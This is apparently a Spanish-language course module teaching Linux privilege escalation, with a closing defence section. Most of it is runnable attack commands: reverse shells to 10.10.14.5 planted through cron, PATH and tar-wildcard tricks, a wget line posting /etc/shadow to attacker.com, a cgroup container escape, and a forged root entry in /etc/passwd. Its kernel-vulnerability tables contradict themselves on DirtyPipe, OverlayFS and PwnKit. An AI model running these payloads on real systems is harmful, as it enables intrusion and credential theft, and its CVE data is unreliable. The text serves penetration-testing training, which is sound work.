# 🔐 Escalada de Privilegios en Linux

> *"Obtuviste una shell como usuario normal. El objetivo real es `root`. Este documento cubre todas las vectors de escalada que encontrarás en la práctica profesional."*

---

## 📋 Tabla de contenido

1. [Enumeración inicial](#1-enumecion-inicial)
2. [SUID / SGID binaries](#2-suid--sgid-binaries)
3. [Sudo abuse](#3-sudo-abuse)
4. [Capabilities de Linux](#4-capabilities-de-linux)
5. [Kernel exploits](#5-kernel-exploits)
6. [Cron jobs](#6-cron-jobs)
7. [Writable /etc/passwd](#7-writable-etcpasswd)
8. [PATH manipulation](#8-path-manipulation)
9. [NFS root squashing](#9-nfs-root-squashing)
10. [Docker escape](#10-docker-escape)
11. [Herramientas automatizadas](#11-herramientas-automatizadas)
12. [Defensa y remediación](#12-defensa-y-remediación)
13. [Referencias](#13-referencias)

---

## 1. Enumeración inicial

Siempre empieza aquí. Antes de intentar escalar, necesitas saber **qué tienes**.

### Lo primero que ejecutas

```bash
# ¿Quién soy? ¿Qué grupos tengo?
id
whoami
groups

# ¿Qué sistema operativo y kernel?
cat /etc/os-release
uname -a
cat /proc/version

# ¿Qué usuarios existen en el sistema?
cat /etc/passwd | grep -v nologin | grep -v /bin/false

# ¿Qué hay en /home?
ls -la /home/
ls -la /home/*/

# ¿Qué procesos están corriendo? (¿alguno como root?)
ps aux | grep root
ps -ef

# ¿Qué puertos están abiertos localmente?
ss -tlnp
netstat -tlnp

# ¿Qué cron jobs hay?
crontab -l 2>/dev/null
ls -la /etc/cron* 2>/dev/null
cat /etc/crontab

# ¿Qué mounts hay?
mount
df -h

# ¿Qué variables de entorno?
env
cat /etc/environment
```

### Archivos con credenciales o tokens

```bash
# Historial de bash de otros usuarios
cat /home/*/.bash_history 2>/dev/null

# Archivos de configuración con passwords
grep -r "password" /etc/ 2>/dev/null
grep -r "passwd" /etc/ 2>/dev/null
find / -name "*.conf" -exec grep -l "pass" {} \; 2>/dev/null
find / -name "*.cfg" -exec grep -l "pass" {} \; 2>/dev/null

# Archivos recientes modificados
find / -mmin -60 -type f 2>/dev/null
find / -user root -perm -4000 2>/dev/null  # SUID de root
```

---

## 2. SUID / SGID binaries

Los bits SUID/SGID permiten que un binary se ejecute con los privilegios del owner (normalmente root) en lugar del usuario que lo ejecuta.

### Qué es SUID

```
-rwsr-xr-x 1 root root  /usr/bin/passwd
       ^
       └── El 's' indica SUID: se ejecuta como root
```

### Enumerar binarios SUID

```bash
# Listar todos los binarios SUID en el sistema
find / -perm -4000 -type f 2>/dev/null

# Listar SGID
find / -perm -2000 -type f 2>/dev/null

# Combinar SUID + SGID
find / -perm -u=s -type f 2>/dev/null
```

### Binarios SUID peligrosos (GTFOBins)

La referencia definitiva: [https://gtfobins.github.io](https://gtfobins.github.io)

| Binary | Uso legítimo | Explotación SUID |
|---|---|---|
| `bash` | Shell | `bash -p` → shell root |
| `python` | Scripting | `python -c 'import os; os.execl("/bin/bash", "bash", "-p")'` |
| `perl` | Scripting | `perl -e 'exec "/bin/bash";'` |
| `ruby` | Scripting | `ruby -e 'exec "/bin/bash"'` |
| `vim` | Editor | `vim -c ':!sh'` |
| `find` | Búsqueda | `find . -exec /bin/bash -p \; -quit` |
| `nmap` | Escaneo | `nmap --interactive` → `!sh` (versiones viejas) |
| `less` | Pager | `less /etc/passwd` → `!sh` |
| `cp` | Copia | `cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash` |
| `wget` | Descargas | `wget --post-file /etc/shadow http://attacker.com/` |

### Ejemplo completo: explotar SUID `find`

```bash
# 1. Encontrar binarios SUID
find / -perm -4000 -type f 2>/dev/null
# Output: /usr/bin/find

# 2. Consultar GTFOBins → find es explotable con SUID

# 3. Ejecutar
find . -exec /bin/bash -p \; -quit

# 4. Verificar
id
# uid=0(root) gid=1000(victim) groups=1000(victim)
```

### Ejemplo: crear binary SUID con `cp`

```bash
# Si find tiene SUID y puedes escribir en /tmp
find /tmp -exec cp /bin/bash /tmp/rootbash \; -quit
chmod +s /tmp/rootbash

# Ahora ejecutar como root
/tmp/rootbash -p
# rootbash-5.1# id
# uid=0(root) gid=0(root) groups=0(root)
```

---

## 3. Sudo abuse

Si el usuario puede ejecutar algo con `sudo`, explota eso.

### Enumerar permisos sudo

```bash
# Ver qué puede ejecutar este usuario con sudo
sudo -l

# Output típico:
# (root) NOPASSWD: /usr/bin/vim
# (root) NOPASSWD: /usr/bin/find
# (root) NOPASSWD: /usr/bin/less
```

### Binarios sudo explotables (GTFOBins)

| Comando | Explotación |
|---|---|
| `sudo vim` | `vim -c ':!sh'` |
| `sudo find` | `sudo find . -exec /bin/bash \; -quit` |
| `sudo less` | `sudo less /etc/passwd` → `!sh` |
| `sudo awk` | `sudo awk 'BEGIN {system("/bin/bash")}'` |
| `sudo python` | `sudo python -c 'import os; os.execl("/bin/bash", "bash")'` |
| `sudo nmap` | `sudo nmap --interactive` → `!sh` |
| `sudo env` | `sudo env /bin/bash` |
| `sudo perl` | `sudo perl -e 'exec "/bin/bash";'` |

### NOPASSWD vs con password

```bash
# NOPASSWD: ejecuta directamente
sudo /usr/bin/vim

# Con password: necesitas la contraseña del usuario
sudo /usr/bin/vim
# [sudo] password for victim:
```

### Ejemplo completo: sudo vim → root

```bash
# 1. Verificar permisos
sudo -l
# (root) NOPASSWD: /usr/bin/vim

# 2. Ejecutar vim como root
sudo vim

# 3. Dentro de vim, ejecutar shell
:!/bin/bash

# 4. Verificar
id
# uid=0(root) gid=0(root) groups=0(root)
```

---

## 4. Capabilities de Linux

Las capabilities son un mecanismo más granular que SUID. Permiten a un binary hacer cosas específicas como root sin ser root completamente.

### Enumerar capabilities

```bash
# Listar todos los binaries con capabilities
getcap -r / 2>/dev/null

# Output típico:
# /usr/bin/python3 = cap_setuid+ep
# /usr/bin/perl = cap_setuid+ep
# /usr/bin/env = cap_setuid+ep
```

### Explotar capabilities

| Capability | Binary | Explotación |
|---|---|---|
| `cap_setuid` | `python3` | `python3 -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash")'` |
| `cap_setuid` | `perl` | `perl -e 'use POSIX; setuid(0); exec "/bin/bash";'` |
| `cap_setuid` | `env` | `env /bin/bash` |
| `cap_dac_read_search` | `tar` | `tar czf /tmp/shadow.tar.gz /etc/shadow` |
| `cap_net_raw` | `ping` | Sniffing de tráfico |

### Ejemplo completo: python con cap_setuid

```bash
# 1. Verificar capabilities
getcap -r / 2>/dev/null
# /usr/bin/python3 = cap_setuid+ep

# 2. Escalar a root
python3 -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash")'

# 3. Verificar
id
# uid=0(root) gid=1000(victim) groups=1000(victim)
```

---

## 5. Kernel exploits

Si el kernel está desactualizado, hay exploits públicos que pueden escalar a root.

### Identificar versión del kernel

```bash
uname -r        # Ejemplo: 4.4.0-31-generic
cat /proc/version
cat /etc/lsb-release
```

### Buscar exploits

```bash
# Con searchsploit (ExploitDB)
searchsploit linux kernel 4.4.0
searchsploit "linux kernel privilege escalation"

# Con exploit-db.com
# Buscar: "linux kernel [versión] privilege escalation"
```

### Ejemplos de kernels vulnerables

| Kernel | Vulnerabilidad | CVE | Explotación |
|---|---|---|---|
| 2.6.x – 3.x | DirtyCOW | CVE-2016-5195 | `gcc dirtycow.c -o dirtycow -lpthread && ./dirtycow` |
| 4.4.x | DirtyPipe | CVE-2022-0847 | `./dirtypipe` (compilar desde PoC) |
| < 5.8.x | OverlayFS | CVE-2015-1328 | `overlayfs` exploit |
| < 4.20.x | PwnKit | CVE-2021-4034 | `pkexec` |

### Ejemplo: DirtyCOW (CVE-2016-5195)

```bash
# 1. Verificar kernel vulnerable
uname -r
# 4.4.0-31-generic (vulnerable: < 4.8.3)

# 2. Compilar y ejecutar exploit
# Descargar PoC de exploit-db
searchsploit -m 40839
gcc 40839.c -o dirtycow -lpthread

chmod +x dirtycow
./dirtycow

# 3. Resultado: shell root
# [+] Exploit successful!
# root@target:~#
```

---

## 6. Cron jobs

Los cron jobs que corren como root son una vector clásica de escalada.

### Enumerar cron jobs

```bash
# Cron jobs del sistema
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# Cron jobs de otros usuarios (si puedes leerlos)
ls -la /var/spool/cron/crontabs/
cat /var/spool/cron/crontabs/*

# Verificar si el directorio de scripts está world-writable
ls -la /usr/local/bin/
ls -la /opt/scripts/
ls -la /home/*/scripts/
```

### Vector de ataque: script world-writable

Si un cron job ejecuta un script que puedes modificar:

```bash
# 1. Detectar script ejecutado por root en cron
cat /etc/crontab
# * * * * * root /opt/scripts/backup.sh

# 2. Verificar permisos del script
ls -la /opt/scripts/backup.sh
# -rwxrwxrwx 1 root root 123 ... /opt/scripts/backup.sh
# ¡World-writable!

# 3. Inyectar reverse shell
echo '#!/bin/bash' > /opt/scripts/backup.sh
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /opt/scripts/backup.sh

# 4. Esperar a que cron lo ejecute (dentro de 1 minuto)
# En tu máquina atacante:
nc -lvnp 4444
```

### Vector de ataque: PATH manipulation

Si un cron job ejecuta un comando **sin ruta absoluta**:

```bash
# En /etc/crontab:
# * * * * * root backup.sh  (¡sin /usr/bin/ o /usr/local/bin/!)

# 1. Verificar si el directorio actual está en PATH
echo $PATH
# /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# 2. Crear tu propio "backup.sh" en un directorio que esté primero en PATH
echo '#!/bin/bash' > /tmp/backup.sh
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /tmp/backup.sh
chmod +x /tmp/backup.sh

# 3. Esperar a que cron lo ejecute
```

### Vector de ataque: wildcard injection (tar)

Si el cron usa `tar` con wildcards:

```bash
# /etc/crontab:
# * * * * * root cd /var/www/html && tar czf /tmp/backup.tar.gz *

# 1. Crear archivos especiales en el directorio
cd /var/www/html

# Crear checkpoint file malicioso
echo '' > "--checkpoint=1"
echo '' > "--checkpoint-action=exec=sh shell.sh"
echo '#!/bin/bash' > shell.sh
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> shell.sh

# 2. Esperar a que tar se ejecute
```

---

## 7. Writable /etc/passwd

Si puedes escribir en `/etc/passwd`, puedes crear un usuario root.

### Verificar

```bash
ls -la /etc/passwd
# -rw-rw-rw- 1 root root 1234 ... /etc/passwd
# ¡Escritura para todos!
```

### Explotar

```bash
# 1. Generar hash de password con openssl
openssl passwd -1 -salt xyz password123
# Output: $1$xyz$hashed_password_here

# 2. Crear entrada de usuario root en /etc/passwd
echo 'newroot:$1$xyz$hashed_password_here:0:0:root:/root:/bin/bash' >> /etc/passwd

# 3. Cambiar al nuevo usuario
su newroot
# Password: password123

# 4. Verificar
id
# uid=0(root) gid=0(root) groups=0(root)
```

---

## 8. PATH manipulation

Si un script o servicio ejecuta binarios sin ruta absoluta y tú puedes modificar el PATH.

### Ejemplo

```bash
# Script vulnerable (ejecutado por root):
#!/bin/bash
cd /tmp
ls  # ¡Ejecuta "ls" pero busca en PATH!

# Tu exploit:
echo '#!/bin/bash' > /tmp/ls
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /tmp/ls
chmod +x /tmp/ls

export PATH=/tmp:$PATH
# Ahora "ls" ejecuta tu reverse shell
```

---

## 9. NFS root squashing

Si un directorio NFS está compartido con `no_root_squash`, puedes montarlo y crear binarios SUID.

### Verificar

```bash
# En el servidor NFS
cat /etc/exports
# /srv/share 192.168.1.0/24(rw,sync,no_root_squash)
# ¡no_root_squash es el problema!
```

### Explotar

```bash
# 1. Montar el share NFS
mkdir /tmp/nfs
mount -t nfs 192.168.1.100:/srv/share /tmp/nfs

# 2. Crear binario SUID en el share
cp /bin/bash /tmp/nfs/rootbash
chmod +s /tmp/nfs/rootbash

# 3. En el servidor, ejecutar el binario
./rootbash -p
# rootbash-5.1# id
# uid=0(root) gid=0(root) groups=0(root)
```

---

## 10. Docker escape

Si estás dentro de un contenedor Docker, hay varias formas de escapar.

### Verificar si estás en un contenedor

```bash
# 1. Buscar archivos de docker
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker

# 2. Intentar montar disco
fdisk -l
mount | grep -v "cgroup\|proc\|sys\|tmpfs"
```

### Vector: docker.sock

```bash
# Si el socket de docker está montado
ls -la /var/run/docker.sock

# 1. Instalar docker CLI (si no está)
apt-get update && apt-get install -y docker.io

# 2. Montar el host filesystem
docker run -v /:/host -it alpine chroot /host

# 3. Verificar
id
# uid=0(root) gid=0(root)
```

### Vector: montar disco del host

```bash
# Si puedes montar dispositivos de bloque
fdisk -l
# /dev/sda1  1  ...  [Linux filesystem]

mkdir /mnt/host
mount /dev/sda1 /mnt/host

# Ahora tienes acceso al filesystem del host
ls /mnt/host/etc/shadow
cat /mnt/host/etc/passwd
```

### Vector: capabilities del contenedor

```bash
# Si el contenedor tiene --privileged
cat /proc/1/status | grep -i cap
# CapPrm: 0000003fffffffff (todas las capabilities)

# Escapar con cgroup release_agent
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp
mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/output" >> /cmd
chmod +x /cmd

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output
```

---

## 11. Herramientas automatizadas

### LinPEAS (la más completa)

```bash
# Descargar
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh
chmod +x linpeas.sh

# Ejecutar (guarda output en archivo)
./linpeas.sh | tee linpeas_output.txt

# Ejecutar solo una categoría
./linpeas.sh -a  # Todas las checks
./linpeas.sh -s  # SUID/SGID
./linpeas.sh -u  # Usuarios
```

**LinPEAS busca automáticamente:**
- Binarios SUID/SGID
- Sudo permissions
- Capabilities
- Cron jobs
- Archivos con credenciales
- Procesos vulnerables
- Configuraciones débiles
- Historial de bash
- Variables de entorno peligrosas

### Linux Exploit Suggester

```bash
# Descargar
wget https://github.com/mzet-/linux-exploit-suggester/archive/master.zip
unzip master.zip
cd linux-exploit-suggester-master

# Ejecutar
./linux-exploit-suggester.sh
./linux-exploit-suggester.sh --checksec  # Verificar protections
```

### LinEnum

```bash
# Descargar
wget https://github.com/rebootuser/LinEnum/archive/master.zip
unzip master.zip
chmod +x LinEnum-master/LinEnum.sh

# Ejecutar
./LinEnum-master/LinEnum.sh -t  # Reporte completo
./LinEnum-master/LinEnum.sh -s  # Solo searches
```

### Comparativa de herramientas

| Herramienta | Velocidad | Cobertura | Output | Ideal para |
|---|---|---|---|---|
| **LinPEAS** | Media | ⭐⭐⭐⭐⭐ | Colorido, detallado | Escaneo completo |
| **LinEnum** | Rápida | ⭐⭐⭐⭐ | Texto limpio | Reportes rápidos |
| **linux-exploit-suggester** | Rápida | ⭐⭐⭐ | Enfocado en exploits | Detectar kernel vulns |

---

## 12. Defensa y remediación

### Para Blue Team / Administradores

| Vector | Detección | Mitigación |
|---|---|---|
| **SUID binaries** | Audit: `find / -perm -4000` regularmente | Eliminar SUID innecesarios, usar `nosuid` en mounts |
| **Sudo abuse** | Logs: `/var/log/auth.log`, `journalctl -u sudo` | Principio de mínimo privilegio, `NOEXEC` en sudoers |
| **Capabilities** | `getcap -r /` periódicamente | Eliminar capabilities innecesarias |
| **Cron abuse** | Monitorear `/etc/crontab` y logs de cron | Rutas absolutas, permisos estrictos, `noexec` |
| **Kernel exploits** | Kernel version monitoring | Mantener kernel actualizado |
| **Writable /etc/passwd** | `ls -la /etc/passwd` en auditorías | `chmod 644 /etc/passwd` siempre |
| **Docker escape** | Audit de `--privileged` containers | No montar docker.sock, usar rootless containers |

### Configuración segura de SUID

```bash
# Encontrar y eliminar SUID innecesarios
find / -perm -4000 -type f 2>/dev/null
# Revisar cada uno y eliminar si no es necesario

# Marcar directorios como no-SUID
mount -o nosuid /tmp
mount -o nosuid /home
```

### Sudoers seguro

```bash
# En vez de:
victim ALL=(root) NOPASSWD: /usr/bin/vim

# Usar:
victim ALL=(root) NOPASSWD: /usr/bin/vim /etc/victim-only/*

# O mejor aún: limitar con NOEXEC
victim ALL=(root) NOPASSWD: NOEXEC: /usr/bin/python3 /opt/scripts/*.py
```

---

## 13. Referencias

### Fuentes primarias

| Recurso | URL |
|---|---|
| **GTFOBins** — Binarios explotables | [https://gtfobins.github.io](https://gtfobins.github.io) |
| **LinPEAS** — Escalada automática | [https://github.com/carlospolop/PEASS-ng](https://github.com/carlospolop/PEASS-ng) |
| **Linux Exploit Suggester** | [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) |
| **HackTricks — Privilege Escalation** | [https://book.hacktricks.xyz/linux-hardening/privilege-escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation) |
| **MITRE ATT&CK — T1548 (Abuse Elevation)** | [https://attack.mitre.org/techniques/T1548/](https://attack.mitre.org/techniques/T1548/) |

### CVEs comunes

| CVE | Nombre | Kernel afectado |
|---|---|---|
| CVE-2016-5195 | DirtyCOW | < 4.8.3 |
| CVE-2022-0847 | DirtyPipe | 5.8 – 5.16.11 |
| CVE-2021-4034 | PwnKit | PolicyKit < 0.120 |
| CVE-2015-1328 | OverlayFS | < 3.19 (Ubuntu) |

---

## 📝 Entregable de portafolio

Para documentar una escalada de privilegios en tu portafolio:

```markdown
# Escalada de Privilegios — [Nombre del sistema]

## Contexto
- Sistema: Ubuntu 20.04 / kernel 5.4.0
- Usuario inicial: victim (uid=1000)
- Herramienta de enumeración: LinPEAS

## Vector encontrado
- SUID binary: /usr/bin/find
- Permisos: -rwsr-xr-x root root

## Explotación paso a paso
1. `find / -perm -4000 -type f 2>/dev/null`
2. GTFOBins indica explotación con SUID
3. `find . -exec /bin/bash -p \; -quit`

## Resultado
- uid=0(root) gid=1000(victim)

## Remediación
- Eliminar SUID de find: `chmod u-s /usr/bin/find`

## Evidencia
- Screenshot: [enlace]
- Output de comandos: [enlace]
```

---

**[⬅ Volver al módulo](../README.md)** · **[→ Escalada Windows](./02-windows-privesc.md)**
